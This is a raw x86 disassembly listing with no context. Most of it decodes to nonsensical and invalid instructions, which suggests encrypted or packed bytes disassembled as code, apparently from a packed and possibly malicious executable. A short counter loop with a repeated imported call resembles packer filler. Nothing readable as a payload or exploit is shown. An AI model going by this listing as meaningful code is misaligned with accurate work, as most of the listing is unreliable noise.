  40489d:	pop    edx
  40489e:	mov    esp,0xfb6bf0da
  4048a3:	je     0x40486f
  4048a5:	mov    ecx,0x40f12227
  4048aa:	push   0x34
  4048ac:	inc    edi
  4048ad:	xor    DWORD PTR [ebx+0x79c856a2],ebx
  4048b3:	pushf  
  4048b4:	mov    eax,ds:0x24d591de
  4048b9:	sub    DWORD PTR [ecx-0x2a],0x11
  4048bd:	lds    edx,FWORD PTR [ebp+0x32c4deb1]
  4048c3:	sti    
  4048c4:	add    al,0x66
  4048c6:	and    BYTE PTR [edi+ebp*2-0x4027e747],dh
  4048cd:	dec    edx
  4048ce:	xor    DWORD PTR ds:0x75d10b1e,eax
  4048d5:	mov    edi,0x9209905
  4048da:	xor    ecx,DWORD PTR [ebx-0x7b]
  4048dd:	cdq    
  4048de:	xor    dh,BYTE PTR [ecx]
  4048e0:	(bad)  
  4048e1:	sbb    bl,dh
  4048e3:	lahf   
  4048e4:	test   DWORD PTR [esi-0x51d57c9],ecx
  4048ea:	mov    edx,0x88011e7
  4048ef:	dec    esi
  4048f0:	je     0x40487e
  4048f2:	mov    edi,esi
  4048f4:	inc    esi
  4048f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048f6:	(bad)  
  4048f7:	retf   
  4048f8:	fdiv   QWORD PTR [eax+ebp*8-0xc02eb3b]
  4048ff:	push   ebp
  404900:	(bad)  
  404902:	xor    eax,0x8c5efd84
  404907:	repnz mov al,ds:0x72debaa8
  40490d:	shr    dh,0x93
  404910:	xchg   edx,eax
  404911:	mov    DWORD PTR [ebx+0x493f7e5e],esp
  404917:	imul   esi,DWORD PTR [edi-0x7cbd6590],0x6c746d3a
  404921:	and    al,0x1d
  404923:	xor    BYTE PTR [edx+0x26],al
  404926:	fcom   QWORD PTR [ecx+0x68]
  404929:	xor    al,0x5e
  40492b:	jg     0x4048c1
  40492d:	popa   
  40492e:	ret    0xb3db
  404931:	in     al,dx
  404932:	mov    dh,0x18
  404934:	(bad)  
  404935:	mov    esp,0xddd8d444
  40493a:	xor    al,0xf5
  40493c:	sub    ch,BYTE PTR [eax+0x7c6b1a5]
  404942:	mov    dl,0xd4
  404944:	cld    
  404945:	in     al,0xe9
  404947:	pusha  
  404948:	dec    edx
  404949:	mov    esp,0x5eafa232
  40494e:	jno    0x404998
  404950:	add    al,0x67
  404952:	cmp    edx,DWORD PTR [ebx]
  404954:	sbb    esi,DWORD PTR [esp+ecx*1-0x71]
  404958:	jnp    0x4049b6
  40495a:	fwait
  40495b:	rcl    DWORD PTR [esi+ecx*1-0x3eab14f4],0xe3
  404963:	push   edi
  404964:	adc    BYTE PTR [ecx-0x5e9b3eaa],ah
  40496a:	lea    ebp,[edi]
  40496c:	(bad)  
  40496d:	push   cs
  40496e:	repz out dx,al
  404970:	shr    BYTE PTR [edx],0xd6
  404973:	or     DWORD PTR [ecx-0x20706a64],edi
  404979:	arpl   WORD PTR [edx],cx
  40497b:	adc    al,0xa6
  40497d:	ror    DWORD PTR ds:0x2e864ef7,1
  404983:	mul    DWORD PTR [eax-0x62]
  404986:	mov    ?,WORD PTR [edi-0x39]
  404989:	clc    
  40498a:	mov    dl,0xbe
  40498c:	pop    esi
  40498d:	mov    ah,BYTE PTR [ebx-0x77]
  404990:	or     ebx,edx
  404992:	mov    ebp,DWORD PTR [ebx-0x5852b6a]
  404998:	hlt    
  404999:	repnz repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40499c:	les    edi,FWORD PTR [edx]
  40499e:	mov    ebp,0xaf80bcf3
  4049a3:	loope  0x404a0d
  4049a5:	pusha  
  4049a6:	aaa    
  4049a7:	int    0x3c
  4049a9:	cmp    al,0x74
  4049ab:	sar    BYTE PTR [ebx],cl
  4049ad:	retf   0x3c04
  4049b0:	xlat   BYTE PTR ds:[ebx]
  4049b1:	or     edi,ebp
  4049b3:	retf   
  4049b4:	inc    edx
  4049b5:	xor    eax,0xb3e3d843
  4049ba:	comiss xmm0,DWORD PTR [ecx-0x24]
  4049be:	pop    ebx
  4049bf:	jns    0x4049c9
  4049c1:	ret    
  4049c2:	sub    eax,0x6240f2c3
  4049c7:	mov    esi,DWORD PTR [ebx+0xf]
  4049ca:	jae    0x404a23
  4049cc:	fadd   DWORD PTR ds:0x36ab8013
  4049d2:	mov    es,WORD PTR [esi]
  4049d4:	xlat   BYTE PTR ds:[ebx]
  4049d5:	xlat   BYTE PTR ds:[ebx]
  4049d6:	test   BYTE PTR [edi+edx*1-0x1ddd7320],bh
  4049dd:	cmp    BYTE PTR [edi+0xf],ah
  4049e0:	clc    
  4049e1:	(bad)  
  4049e2:	mov    ss,edx
  4049e4:	sbb    dl,BYTE PTR [edi+0x45]
  4049e7:	js     0x4049d4
  4049e9:	inc    esi
  4049ea:	(bad)  
  4049eb:	loope  0x404982
  4049ed:	outs   dx,DWORD PTR ds:[esi]
  4049ee:	mov    eax,ds:0xb3c4befa
  4049f3:	je     0x404a4a
  4049f5:	pop    ebx
  4049f6:	mov    dh,0x64
  4049f8:	xor    al,al
  4049fa:	sbb    DWORD PTR [ebx+esi*1],ebp
  4049fd:	sbb    bl,BYTE PTR [ecx-0x2b]
  404a00:	jge    0x4049ef
  404a02:	xchg   esi,eax
  404a03:	pushf  
  404a04:	inc    edi
  404a05:	sbb    al,0xb3
  404a07:	pop    esp
  404a08:	inc    BYTE PTR [edi+eax*4+0x72]
  404a0c:	mov    ebx,0x53704f85
  404a11:	add    ebp,DWORD PTR [esi+0x4c]
  404a14:	adc    eax,0xd982696d
  404a19:	xchg   esi,eax
  404a1a:	inc    edi
  404a1b:	popa   
  404a1c:	cmp    DWORD PTR [eax],0x78f05169
  404a22:	sti    
  404a23:	push   edi
  404a24:	fsubr  DWORD PTR [edi+0x6223e0d0]
  404a2a:	clc    
  404a2b:	rcl    DWORD PTR [ebp+0x4c120672],cl
  404a31:	mov    ebx,DWORD PTR ds:0x1cb16245
  404a37:	(bad)  [ebx]
  404a39:	repnz scas al,BYTE PTR es:[edi]
  404a3b:	int    0xac
  404a3d:	pop    edi
  404a3e:	and    DWORD PTR [ebx-0x7e7d1843],eax
  404a44:	xchg   esi,eax
  404a45:	xor    dh,0xd5
  404a48:	sub    DWORD PTR [edi+0x8],ecx
  404a4b:	fisttp DWORD PTR [eax+0x510850b9]
  404a51:	pop    es
  404a52:	and    DWORD PTR ds:0x42a859,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a859
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a859,esi
  404a69:	cmp    DWORD PTR ds:0x42a859,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a859,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a859
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a859,esi
  404ab7:	cmp    DWORD PTR ds:0x42a859,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a81d
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	sbb    esp,edx
  404ae4:	popf   
  404ae5:	inc    edx
  404ae6:	inc    esi
  404ae7:	cs js  0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404b4a
  404aef:	jne    0x404a9a
  404af1:	lods   eax,DWORD PTR ds:[esi]
  404af2:	(bad)  
  404af5:	mov    al,ds:0x26c89b5
  404afa:	add    esi,DWORD PTR [edi]
  404afc:	ja     0x404b3b
  404afe:	or     cl,BYTE PTR [edx-0x1c42a5d8]
  404b04:	mov    DWORD PTR [ecx+0x2a],ebp
  404b07:	push   bp
  404b09:	mov    ebp,0x973285d4
  404b0e:	xchg   ebp,eax
  404b0f:	cmp    al,0xbf
  404b11:	adc    ebx,ebx
  404b13:	les    edx,FWORD PTR [ebp+0x48]
  404b16:	test   al,0x15
  404b18:	ss std 
  404b1a:	and    eax,0x129d66
  404b1f:	cmp    dh,ch
  404b21:	inc    esi
  404b22:	dec    edi
  404b23:	lea    edi,[edx+0x3]
  404b26:	lock (bad) 
  404b28:	jmp    0x404b5a
  404b2a:	xchg   BYTE PTR [edx-0x60ae00f6],al
  404b30:	mov    al,0x7a
  404b32:	popf   
  404b33:	lods   al,BYTE PTR ds:[esi]
  404b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b35:	les    eax,FWORD PTR [eax-0x7e]
  404b38:	fnstenv [ebx+0x237eca8]
  404b3e:	cmp    al,0xb5
  404b40:	mov    bl,0x55
  404b42:	aas    
  404b43:	xor    BYTE PTR [edx+0x53],0x55
  404b47:	mov    edx,0xcf268fb9
  404b4c:	inc    ebx
  404b4d:	add    eax,0x1d1d15a7
  404b52:	stc    
  404b53:	or     al,0x2c
  404b55:	mov    ebx,0x7dfee0be
  404b5a:	icebp  
  404b5b:	cmp    DWORD PTR [edi],eax
  404b5d:	sub    eax,0xf5070907
  404b62:	ret    
  404b63:	or     dh,BYTE PTR es:[edx]
  404b66:	jp     0x404b88
  404b68:	push   0xdd813cfa
  404b6d:	sub    ebp,0xed8dee67
  404b73:	mov    dh,0x70
  404b75:	fucomp st(4)
  404b77:	test   bh,dh
  404b79:	xor    al,al
  404b7b:	mov    dl,0x1d
  404b7d:	repz push edi
  404b7f:	adc    BYTE PTR [eax+0x713310fe],dl
  404b85:	and    ebx,edi
  404b87:	std    
  404b88:	xchg   ebp,eax
  404b89:	scas   eax,DWORD PTR es:[edi]
  404b8a:	and    ah,BYTE PTR [esi+edi*2-0x4e7723fd]
  404b91:	xchg   cl,dl
  404b93:	cld    
  404b94:	fdivr  st(6),st
  404b96:	fisubr WORD PTR [edx]
  404b98:	outs   dx,BYTE PTR ds:[esi]
  404b99:	imul   eax,DWORD PTR [edx-0x16],0x44
  404b9d:	jbe    0x404b62
  404b9f:	cli    
  404ba0:	pop    edi
  404ba1:	inc    edx
  404ba2:	leave  
  404ba3:	xor    eax,0xe543b4b9
  404ba8:	int3   
  404ba9:	pop    esp
  404baa:	mov    ebx,0x79712a6a
  404baf:	xrelease xchg BYTE PTR [esi-0x44],bl
  404bb3:	mov    dl,0x87
  404bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb6:	loope  0x404b46
  404bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb9:	hlt    
  404bba:	cli    
  404bbb:	mov    esp,0xf0354ddf
  404bc0:	imul   ecx,DWORD PTR [edx+edx*8-0x3b],0xffffffdc
  404bc5:	(bad)  [ecx]
  404bc7:	dec    esp
  404bc8:	(bad)  [ebp+ebx*4-0x40]
  404bcc:	outs   dx,BYTE PTR ds:[esi]
  404bcd:	push   ecx
  404bce:	fistp  QWORD PTR [edx+0xd]
  404bd1:	and    bh,BYTE PTR [eax-0x4e]
  404bd4:	ror    BYTE PTR [ebp-0xd5a54bf],cl
  404bda:	mov    esi,0x1979a2eb
  404bdf:	mov    al,ds:0x9e74e79b
  404be4:	test   eax,0xd011aeb5
  404be9:	push   es
  404bea:	pop    esi
  404beb:	and    ecx,DWORD PTR [edi+ecx*2+0xedcc4f6]
  404bf2:	das    
  404bf3:	es inc ebx
  404bf5:	daa    
  404bf6:	cmp    dl,BYTE PTR [ebx+0x6f]
  404bf9:	cdq    
  404bfa:	les    ebp,FWORD PTR [ebp-0x6c858341]
  404c00:	jbe    0x404c01
  404c02:	pusha  
  404c03:	fcomip st,st(3)
  404c05:	pop    esi
  404c06:	sbb    al,0x5d
  404c08:	stos   DWORD PTR es:[edi],eax
  404c09:	(bad)  
  404c0a:	jo     0x404c0c
  404c0c:	pop    esi
  404c0d:	push   esp
  404c0e:	pop    ss
  404c0f:	mov    ds:0x237c11c3,al
  404c14:	fs es out dx,al
  404c17:	call   0x71d9:0xba9b9ff3
  404c1e:	cmp    DWORD PTR [ebp+0x6f],0xc759aa66
  404c25:	(bad)  
  404c26:	mov    cl,0xa6
  404c28:	(bad)  
  404c2a:	pop    ecx
  404c2b:	pop    ebp
  404c2c:	pop    ecx
  404c2d:	mov    BYTE PTR [ecx+0x32],cl
  404c30:	add    al,0xea
  404c32:	(bad)  
  404c33:	(bad)  
  404c34:	fnstenv [esp+ecx*2-0x1b3746fc]
  404c3b:	jnp    0x404c90
  404c3d:	(bad)  
  404c3e:	adc    ebx,0x2981f1d0
  404c44:	in     al,dx
  404c45:	pusha  
  404c46:	pusha  
  404c47:	push   es
  404c48:	sbb    al,0x9a
  404c4a:	out    0x2e,eax
  404c4c:	scas   al,BYTE PTR es:[edi]
  404c4d:	inc    edi
  404c4e:	push   cs
  404c4f:	loopne 0x404c6b
  404c51:	ret    0x924c
  404c54:	ja     0x404bf2
  404c56:	shl    DWORD PTR [ecx+ebx*4],cl
  404c59:	test   esi,esp
  404c5b:	punpckhwd mm3,QWORD PTR [esi+0x48]
  404c5f:	pop    eax
  404c60:	push   ecx
  404c61:	test   DWORD PTR [esi-0x2e9d0bb],0xb42a2e60
  404c6b:	loop   0x404c88
  404c6d:	sub    eax,0xe119c69a
  404c72:	xor    al,BYTE PTR [ebx+0x5c882857]
  404c78:	jae    0x404c2f
  404c7a:	mov    BYTE PTR [eax],ch
  404c7c:	test   BYTE PTR ds:0x236c2d66,bh
  404c82:	inc    esi
  404c83:	lea    ebp,[ebx]
  404c85:	mov    BYTE PTR [edx+0x68],cl
  404c88:	fisttp WORD PTR [esi-0x8961a4a]
  404c8e:	and    dh,dl
  404c90:	addr16 leave 
  404c92:	enter  0x6320,0xf
  404c96:	pop    esp
  404c97:	arpl   WORD PTR [ebx-0x2b08e9f4],bx
  404c9d:	ret    
  404c9e:	rcl    DWORD PTR [esi-0x1],1
  404ca1:	mov    WORD PTR [ebx-0x4f],ds
  404ca4:	nop
  404ca5:	jmp    0x404c2c
  404ca7:	jo     0x404c88
  404ca9:	loope  0x404c53
  404cab:	cmp    eax,0xa101a3f8
  404cb0:	sub    eax,DWORD PTR [ecx+eax*8+0x44e1b9c0]
  404cb7:	pop    ss
  404cb8:	mov    BYTE PTR [ebp-0x176993ff],0x55
  404cbf:	or     ebp,DWORD PTR [edx-0x14]
  404cc2:	ficomp WORD PTR [ebp+0x7dca169e]
  404cc8:	mov    BYTE PTR [ecx+0x2a9e5684],0x20
  404ccf:	cmp    dh,bh
  404cd1:	sub    eax,0x73fcedf1
  404cd6:	neg    BYTE PTR ds:0x41ea7152
  404cdc:	jne    0x404cf1
  404cde:	mov    esi,0xcb2b8b28
  404ce3:	(bad)  
  404ce4:	lds    edi,FWORD PTR [edx-0x77]
  404ce7:	cmp    BYTE PTR [esi-0x20],0x92
  404ceb:	mov    ebp,0xa929a5c3
  404cf0:	adc    bl,bh
  404cf2:	pop    esp
  404cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf4:	sub    dl,al
  404cf6:	mov    ecx,?
  404cf8:	not    DWORD PTR [edi+0x75d6108a]
  404cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cff:	js     0x404c9a
  404d01:	cmp    al,0x10
  404d03:	xor    BYTE PTR [eax+0x62986db9],ah
  404d09:	add    al,0x3a
  404d0b:	sub    ecx,edx
  404d0d:	push   esi
  404d0e:	jns    0x404d73
  404d10:	push   eax
  404d11:	mov    dh,0x19
  404d13:	(bad)  
  404d14:	aam    0xd
  404d16:	mov    ebp,0xe5baaa35
  404d1b:	sbb    BYTE PTR [eax+0x41],al
  404d1e:	cmp    eax,0xff790d1
  404d23:	sbb    esi,DWORD PTR [edi]
  404d25:	mov    BYTE PTR [edi],0x7e
  404d28:	add    ecx,eax
  404d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d2b:	sbb    al,0x77
  404d2d:	and    al,0x48
  404d2f:	push   esp
  404d30:	call   0xeb7b:0xc26eef73
  404d37:	mov    ch,0xc
  404d39:	ins    DWORD PTR es:[edi],dx
  404d3a:	pusha  
  404d3b:	adc    BYTE PTR [ebx-0x62],0x56
  404d3f:	dec    edx
  404d40:	cmp    al,0x89
  404d42:	xchg   DWORD PTR [edi],ebx
  404d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d45:	retf   0xe0f6
  404d48:	call   FWORD PTR [edi]
  404d4a:	add    BYTE PTR [esi+ebx*2-0x23a86c13],bl
  404d51:	cmp    al,0x92
  404d53:	pop    ebx
  404d54:	mov    bh,0x95
  404d56:	retf   
  404d57:	or     DWORD PTR [eax-0x75],eax
  404d5a:	pop    ebp
  404d5b:	sub    dh,BYTE PTR [esi-0x38]
  404d5e:	ins    BYTE PTR es:[edi],dx
  404d5f:	xchg   edi,eax
  404d60:	mov    bh,0x51
  404d62:	sbb    bh,ah
  404d64:	fwait
  404d65:	mov    ebp,0xf0f24c81
  404d6a:	push   ds
  404d6b:	mov    ah,0xd3
  404d6d:	sbb    ch,BYTE PTR [edi+0x3e6283f7]
  404d73:	inc    ecx
  404d74:	pusha  
  404d75:	cwde   
  404d76:	push   es
  404d77:	call   DWORD PTR [ebp+0x21]
  404d7a:	popa   
  404d7b:	add    BYTE PTR [edx+edx*2+0x0],dh
  404d7f:	jns    0x404de9
  404d81:	xchg   esi,eax
  404d82:	jmp    0x404d9a
  404d84:	pop    es
  404d85:	and    bl,ah
  404d87:	mov    ds:0xdf538cc0,al
  404d8c:	jmp    0x1cec:0x9bf47ec5
  404d93:	mov    esi,0xe3b67a1a
  404d98:	push   ebx
  404d99:	mov    eax,0xa77ff0b1
  404d9e:	and    BYTE PTR [esi],0xd5
  404da1:	inc    eax
  404da2:	aam    0x12
  404da4:	mov    al,ds:0x1ff74d8d
  404da9:	lea    eax,[esi-0x72bf0879]
  404daf:	inc    ebp
  404db0:	adc    DWORD PTR [esi],edi
  404db2:	mov    ah,BYTE PTR [edx-0x24104542]
  404db8:	(bad)
  404dbb:	call   0x5705:0x376cc5b3
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	mov    esi,0x9bc95ee7
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e33
  404df5:	scas   eax,DWORD PTR es:[edi]
  404df6:	daa    
  404df7:	test   ebx,ebx
  404df9:	sub    bh,BYTE PTR [ecx+eax*2]
  404dfc:	test   al,0x8e
  404dfe:	jo     0x404de3
  404e00:	mov    ebp,?
  404e02:	inc    ecx
  404e03:	jle    0x404e46
  404e05:	or     ebx,ebp
  404e07:	ja     0x404ddf
  404e09:	mov    eax,ds:0xbd9ed6d4
  404e0e:	xor    BYTE PTR [edx+0x2f],0x4d
  404e12:	ret    0xca36
  404e15:	add    al,0x8c
  404e17:	mov    al,ds:0xa78cd8c1
  404e1c:	das    
  404e1d:	fld    QWORD PTR [esi-0x7fc0b154]
  404e23:	aaa    
  404e24:	fld    DWORD PTR [eax+0x2397f4d2]
  404e2a:	imul   edi,DWORD PTR [ebp-0x2d],0x8
  404e2e:	bnd js 0x404e64
  404e31:	jmp    0x56d7b756
  404e36:	push   edi
  404e37:	stos   DWORD PTR es:[edi],eax
  404e38:	adc    ah,BYTE PTR [ebx+0x5a]
  404e3b:	push   0x28
  404e3d:	test   eax,0x3f423e2a
  404e42:	scas   eax,DWORD PTR es:[edi]
  404e43:	fwait
  404e44:	shl    cl,1
  404e46:	push   ebx
  404e47:	add    BYTE PTR [esi],ah
  404e49:	xchg   esi,eax
  404e4a:	ds jns 0x404e72
  404e4d:	ret    
  404e4e:	mov    eax,esi
  404e50:	lahf   
  404e51:	xchg   ebx,eax
  404e52:	arpl   WORD PTR [ebx],dx
  404e54:	call   0xc582:0x571a44a8
  404e5b:	out    dx,al
  404e5c:	sbb    eax,0x864b7977
  404e61:	add    al,0xf9
  404e63:	jne    0x404ec4
  404e65:	xor    ecx,esi
  404e67:	sbb    ah,BYTE PTR [ebx-0x378771f4]
  404e6d:	pop    ss
  404e6e:	pop    ecx
  404e6f:	cmc    
  404e70:	xchg   esp,eax
  404e71:	repz or edx,DWORD PTR [esi+0x32]
  404e75:	jmp    0x404e6b
  404e77:	ret    0x9396
  404e7a:	gs inc ebp
  404e7c:	pop    ebp
  404e7d:	bound  ebx,QWORD PTR [esi+edi*4+0x129f17a7]
  404e84:	icebp  
  404e85:	sbb    WORD PTR [edx+ebp*1+0xddbe5ea],bx
  404e8d:	inc    esi
  404e8e:	fmul   QWORD PTR [esp+edi*2]
  404e91:	inc    esi
  404e92:	or     eax,0x38a2aabd
  404e97:	jmp    0x404e3f
  404e99:	add    esp,DWORD PTR [ecx+0x1d]
  404e9c:	pop    eax
  404e9d:	cli    
  404e9e:	(bad)  [ebx]
  404ea0:	rcr    ah,cl
  404ea2:	mov    bl,0x70
  404ea4:	or     DWORD PTR [esi+ebx*2+0x487ff998],esi
  404eab:	fs nop
  404ead:	or     al,0xa4
  404eaf:	jle    0x404ec9
  404eb1:	inc    edi
  404eb2:	lods   al,BYTE PTR ds:[esi]
  404eb3:	adc    al,0x8
  404eb5:	pop    ss
  404eb6:	cmp    al,0x23
  404eb8:	dec    edi
  404eb9:	adc    ebp,eax
  404ebb:	push   0xffffffe1
  404ebd:	dec    esi
  404ebe:	xor    DWORD PTR [ecx],ebp
  404ec0:	shr    DWORD PTR [eax+ecx*1],1
  404ec3:	xchg   edi,eax
  404ec4:	dec    edi
  404ec5:	mov    ds:0xa8676b5f,al
  404eca:	fld    QWORD PTR [edi-0x30fc4f4d]
  404ed0:	and    al,BYTE PTR [ebp-0x2e]
  404ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ed4:	xor    eax,0x4e086c07
  404ed9:	or     al,0xdb
  404edb:	clc    
  404edc:	inc    edx
  404edd:	mov    ds:0xe4848960,eax
  404ee2:	frstor [ebx-0x309b1649]
  404ee8:	push   ss
  404ee9:	mov    ah,0x47
  404eeb:	mov    esp,0x4083b5a2
  404ef0:	adc    al,BYTE PTR [ebx]
  404ef2:	or     eax,0x1034ff6d
  404ef7:	jo     0x404f12
  404ef9:	mov    dh,0x70
  404efb:	stos   BYTE PTR es:[edi],al
  404efc:	push   0x74
  404efe:	ficom  WORD PTR [esi]
  404f00:	push   edx
  404f01:	loop   0x404f0f
  404f03:	sbb    eax,0xe9877f34
  404f08:	fs (bad) 
  404f0a:	(bad)  
  404f0b:	adc    al,BYTE PTR [ebx]
  404f0d:	xor    eax,0x7de1324f
  404f12:	push   es
  404f13:	ss ds nop
  404f16:	add    ecx,ecx
  404f18:	das    
  404f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f1a:	jns    0x404f4f
  404f1c:	sbb    BYTE PTR [ebx-0x304bd740],ch
  404f22:	sub    dl,BYTE PTR ds:0x52ae32aa
  404f28:	(bad)  
  404f29:	out    0x39,eax
  404f2b:	lea    ebx,[edi+0x48]
  404f2e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404f30:	pop    eax
  404f31:	stc    
  404f32:	mov    ds:0x613076e6,al
  404f37:	inc    eax
  404f38:	sbb    esi,DWORD PTR [edx-0x67efdd79]
  404f3e:	xlat   BYTE PTR ds:[ebx]
  404f3f:	jne    0x404ed7
  404f41:	outs   dx,DWORD PTR ds:[esi]
  404f42:	jb     0x404fbe
  404f44:	inc    ebx
  404f45:	push   edx
  404f46:	xor    ch,ah
  404f48:	sub    al,0x5f
  404f4a:	in     al,0xf2
  404f4c:	stos   BYTE PTR es:[edi],al
  404f4d:	xor    al,0xe1
  404f4f:	and    ebx,edi
  404f51:	into   
  404f52:	or     DWORD PTR [esi-0x69c44c4],esp
  404f58:	pop    ecx
  404f59:	loop   0x404f29
  404f5b:	jae    0x404ef0
  404f5d:	push   ss
  404f5e:	fs mov al,bl
  404f61:	xor    esi,DWORD PTR [ebp+ebp*1+0x7b8ead3]
  404f68:	jge    0x404f1b
  404f6a:	mov    ebx,0x1fc8f6de
  404f6f:	dec    ecx
  404f70:	jge    0x404f71
  404f72:	mov    eax,ds:0x5fc583ae
  404f77:	or     ecx,DWORD PTR [ebx+edi*8-0x58]
  404f7b:	push   eax
  404f7c:	fsubr  DWORD PTR [edi]
  404f7e:	xor    edi,DWORD PTR [edx-0xdfc9fb5]
  404f84:	jmp    0x4ab4:0xc17d1e8
  404f8b:	call   0x1a45:0x90e0134
  404f92:	push   0x2f4e0837
  404f97:	ins    DWORD PTR es:[edi],dx
  404f98:	fucomi st,st(1)
  404f9a:	xor    eax,0x60ccb292
  404f9f:	sahf   
  404fa0:	mov    ah,0x1d
  404fa2:	mov    eax,0x92a1aa90
  404fa7:	ret    
  404fa8:	pop    ecx
  404fa9:	xor    esi,DWORD PTR [ecx]
  404fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fac:	lahf   
  404fad:	lahf   
  404fae:	sub    eax,0x53022b7b
  404fb3:	sbb    al,0xa
  404fb5:	fmul   st,st(6)
  404fb7:	mov    BYTE PTR [eax],0xb1
  404fba:	xor    DWORD PTR [edi+0x2d],ebp
  404fbd:	xor    eax,ebp
  404fbf:	int    0x92
  404fc1:	ret    0x5c35
  404fc4:	(bad)
  404fc7:	scas   al,BYTE PTR es:[edi]
  404fc8:	lods   eax,DWORD PTR ds:[esi]
  404fc9:	cli    
  404fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fcb:	dec    eax
  404fcc:	cmp    DWORD PTR [ebp+0x79],ebp
  404fcf:	jae    0x40502f
  404fd1:	jl     0x405042
  404fd3:	xchg   edi,ebp
  404fd5:	cmp    ecx,edx
  404fd7:	mov    al,ds:0x227a8701
  404fdc:	cli    
  404fdd:	push   eax
  404fde:	inc    ecx
  404fdf:	ror    DWORD PTR [esi+0x1a03d867],0xbe
  404fe6:	dec    ebx
  404fe7:	jmp    0x2887:0x1743
  404fed:	cmp    al,0x6e
  404fef:	mov    eax,0xbe18dcbb
  404ff4:	data16 clc 
  404ff6:	sbb    DWORD PTR [ebp-0x1d9b885a],esi
  404ffc:	int    0x64
  404ffe:	or     eax,0x47c1fba6
  405003:	jg     0x404ff7
  405005:	mov    DWORD PTR [edi-0x4a],ebp
  405008:	mov    ds:0x8b42780c,al
  40500d:	dec    ebx
  40500e:	sbb    BYTE PTR [esi-0x713b5a23],ah
  405014:	dec    ebp
  405015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405016:	xor    al,0xa4
  405018:	arpl   ax,di
  40501a:	nop
  40501b:	es inc ebp
  40501d:	push   eax
  40501e:	outs   dx,DWORD PTR ds:[esi]
  40501f:	or     ebp,DWORD PTR [edi]
  405021:	fld    DWORD PTR [ebx+ebp*4-0x73]
  405025:	xchg   edx,eax
  405026:	bound  esp,QWORD PTR [edi+ecx*4+0x28]
  40502a:	repz pop ss
  40502c:	cs push edx
  40502e:	stos   DWORD PTR es:[edi],eax
  40502f:	jns    0x404fc4
  405031:	dec    ebx
  405032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405033:	pop    ecx
  405034:	lea    ebx,[edx+0x4b094b14]
  40503a:	stc    
  40503b:	cmp    eax,0x49ef7c2
  405040:	je     0x405092
  405042:	sub    bh,BYTE PTR [ecx]
  405044:	(bad)  [edx+0x33152f9b]
  40504a:	mov    dh,0xb0
  40504c:	and    eax,0x5522cf9b
  405051:	jne    0x40502c
  405053:	loope  0x405092
  405055:	jo     0x405068
  405057:	xchg   esp,eax
  405058:	imul   edi,edi,0xffffff93
  40505b:	dec    ebx
  40505c:	and    BYTE PTR [esi-0x16],bl
  40505f:	dec    esp
  405060:	call   0x921b:0x2f979fe2
  405067:	mov    al,ds:0x10c322
  40506c:	mov    bh,0xbb
  40506e:	pop    ebx
  40506f:	(bad)
  405073:	gs xchg ecx,eax
  405075:	jns    0x40503c
  405077:	mov    eax,ds:0xf1eee425
  40507c:	(bad)  
  40507e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40507f:	arpl   WORD PTR [ebx],di
  405081:	in     al,0x87
  405083:	sbb    dh,BYTE PTR [edi]
  405085:	inc    ebp
  405086:	ror    DWORD PTR [esi+0x2a],cl
  405089:	jno    0x405039
  40508b:	pmulhw mm0,QWORD PTR [ecx]
  40508e:	and    DWORD PTR [ecx+0x73f9c0f5],0x95d58de3
  405098:	scas   eax,DWORD PTR es:[edi]
  405099:	mov    eax,0xb487ef01
  40509e:	mov    edx,fs
  4050a0:	jmp    0xa7dd:0x156d719a
  4050a7:	outs   dx,DWORD PTR ds:[esi]
  4050a8:	ss in  eax,0x55
  4050ab:	fwait
  4050ac:	and    DWORD PTR [ebx+ebx*8-0x5ea4d3e0],esp
  4050b3:	repz push esp
  4050b5:	sti    
  4050b6:	shl    DWORD PTR [ebp+0x6e],cl
  4050b9:	inc    esp
  4050ba:	call   0xe89faec6
  4050bf:	js     0x405052
